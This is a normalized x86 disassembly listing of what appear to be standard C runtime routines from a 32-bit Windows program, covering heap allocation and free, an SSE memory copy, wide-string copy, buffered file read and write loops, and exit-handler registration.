mov ecx [ ebp - 0x4 ]
call sub_40b6a0
sub_40f2e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x1
jne r-xdata
movzx ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b390
add eax [ ebp + 0x8 ]
push eax
call sub_40d560
add esp 0xc
lea eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b390
add eax [ ebp + 0x8 ]
push eax
call sub_40ab70
add esp 0x8
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
sub_40f330
push ebp
mov ebp esp
push 0xffffffff
push sub_41beb8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_40b0c0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_40b280
mov esi eax
mov eax [ ebp + 0x10 ]
push eax
call sub_40a9a0
add esp 0x4
add esi eax
push esi
lea ecx [ ebp - 0x28 ]
call sub_40f490
mov ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_40f430
mov edx [ ebp + 0x10 ]
push edx
lea ecx [ ebp - 0x28 ]
call sub_40f450
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40f130
mov ecx [ ebp - 0x2c ]
or ecx 0x1
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40b130
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_40f3f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_40f470
push eax
call sub_40c1b0
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_40f130
mov ecx [ ebp - 0x4 ]
or ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_40f470
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40f4e0
mov esp ebp
pop ebp
retn 0x4
sub_40f490
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
ja r-xdata
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x8 ] edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40ba60
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
sub_40f4e0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_40b280
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40b280
sub eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b5c0
mov edx [ ebp - 0x4 ]
or eax 0xffffffff
sub eax [ edx + 0x10 ]
cmp eax [ ebp + 0x10 ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] ecx
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b970
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
add edx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edx
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40ba60
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40b5e0
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_40aa00
add esp 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
sub_40f5a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_40a9a0
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40f5d0
mov esp ebp
pop ebp
retn 0x4
sub_40f5d0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40bb10
movzx ecx al
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
or ecx 0xffffffff
sub ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0xc ]
ja r-xdata
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
sub ecx eax
sar ecx 0x1
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40f4e0
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b970
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40ba60
movzx edx al
test edx edx
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa00
add esp 0xc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
sub_40f691
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_410eb4
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_410ec7
pop ecx
mov [ esi ] eax
pop esi
sub_40f6c9
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_410f1d
pop ecx
call sub_410eb4
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
test esi esi
je r-xdata
call sub_4112f2
push 0x1e
call sub_41134f
push 0xff
call sub_411032
xor ecx ecx
inc ecx
mov ecx esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
jmp r-xdata
push 0xc
pop ebx
cmp [ rw-data ] eax
je r-xdata
push ecx
push 0x0
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop esi
pop ebp
retn
call sub_410eb4
mov [ eax ] ebx
push esi
call sub_410f1d
pop ecx
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp r-xdata
call sub_410eb4
mov [ eax ] ebx
sub_40f760
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_40fc34 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40fb38 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fc34 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40f9ac ]
jmp [ ecx * 4 + jump_table_40fa2c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40fa98 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40fc34 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40fa98 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fc34 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fc34 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fc34 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40fa98 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40fa98 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40fa98 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_40fa98 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_40fda4
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_410eb4
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi edi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ edi ] ax
call sub_410eb4
push 0x22
jmp r-xdata
movzx eax [ edx ]
mov [ esi + edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_41179e
mov eax esi
sub_40fe10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_410eb4
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
xor eax eax
mov [ esi ] ax
xor eax eax
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_410eb4
push 0x22
jmp r-xdata
movzx eax [ ecx ]
mov [ edi + ecx ] ax
lea ecx [ ecx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_41179e
mov eax esi
sub_40fe6c
push esi
push 0x4
push 0x20
call sub_411fca
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_40fe9b
push 0xc
push r--data
call sub_411a70
call sub_41119d
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_40fedb
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fed5
mov eax esi
call sub_411ab5
retn
sub_40fedb
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call esi
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp ebx eax
jb r-xdata
xor eax eax
mov edi ebx
sub edi eax
lea ecx [ edi + 0x4 ]
cmp ecx 0x4
jb r-xdata
push eax
call sub_411f97
mov esi eax
lea eax [ edi + 0x4 ]
pop ecx
cmp esi eax
jae r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
lea ecx [ ebx + 0x4 ]
push ecx
mov [ ebx ] eax
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push ebx
call sub_41205d
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push ebx
call sub_41205d
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea ebx [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_40ffa6
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
je r-xdata
xor eax eax
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
test ecx ecx
jne r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
call sub_410eb4
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ebx eax
jbe r-xdata
test esi esi
je r-xdata
push [ ebp + 0xc ]
push 0x0
push ecx
call sub_412270
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi ebx
test [ esi + 0xc ] 0x10c
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ebx eax
ja r-xdata
mov ecx 0x1000
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
mov [ ebp - 0xc ] ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push esi
call sub_4120a9
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
js r-xdata
sub edi ebx
mov eax edi
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
cmp ebx 0x7fffffff
ja r-xdata
xor edx edx
cmp ebx 0x7fffffff
jbe r-xdata
or [ esi + 0xc ] 0x20
cmp ebx eax
jae r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] al
inc edx
dec ebx
dec ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] ecx
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov eax ebx
mov eax ebx
div ecx
mov eax ebx
mov eax 0x7fffffff
div ecx
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp eax ecx
ja r-xdata
mov eax ebx
mov [ ebp - 0x10 ] ebx
call sub_410eb4
mov [ eax ] 0x22
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_412270
add esp 0xc
push eax
push [ ebp - 0x4 ]
push esi
call sub_4121ca
pop ecx
push eax
call sub_412408
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
push eax
push [ esi ]
push ecx
push [ ebp - 0x4 ]
call sub_4121ee
mov eax [ ebp - 0x10 ]
sub [ esi + 0x4 ] eax
add esp 0x10
sub ebx eax
add [ esi ] eax
jmp r-xdata
call sub_41179e
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
add [ ebp - 0x4 ] eax
sub [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
jmp r-xdata
sub ebx eax
test ebx ebx
jne r-xdata
sub_410184
push 0xc
push r--data
call sub_411a70
xor edi edi
mov [ ebp - 0x1c ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
jne r-xdata
push esi
call sub_411879
pop ecx
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ffa6
add esp 0x14
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41020d
mov eax edi
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_411ab5
retn
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_412270
add esp 0xc
sub_410244
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
or eax 0xffffffff
xor edx edx
div ecx
cmp ebx eax
ja r-xdata
mov edi ecx
imul edi ebx
test [ esi + 0xc ] 0x10c
mov ebx edi
je r-xdata
mov ecx 0x1000
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov edx [ esi + 0xc ]
and edx 0x108
je r-xdata
mov [ ebp - 0x4 ] ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_411dc2
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test edx edx
je r-xdata
js r-xdata
sub edi ebx
mov eax edi
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov ecx [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x4 ] ecx
test ecx ecx
jg r-xdata
mov eax ebx
test ecx ecx
je r-xdata
push esi
call sub_413ba6
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
cmp ebx eax
jae r-xdata
test ebx ebx
jne r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ebx
xor edx edx
div ecx
mov eax ebx
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push [ esi ]
call sub_412c10
mov eax [ ebp - 0x8 ]
sub [ esi + 0x4 ] eax
add [ esi ] eax
add esp 0xc
sub ebx eax
add [ ebp + 0x8 ] eax
jmp r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
mov ecx [ ebp - 0x8 ]
mov edx ecx
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x8 ]
push esi
call sub_4121ca
pop ecx
push eax
call sub_413254
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] edx
sub ebx edx
cmp eax ecx
jb r-xdata
mov edx eax
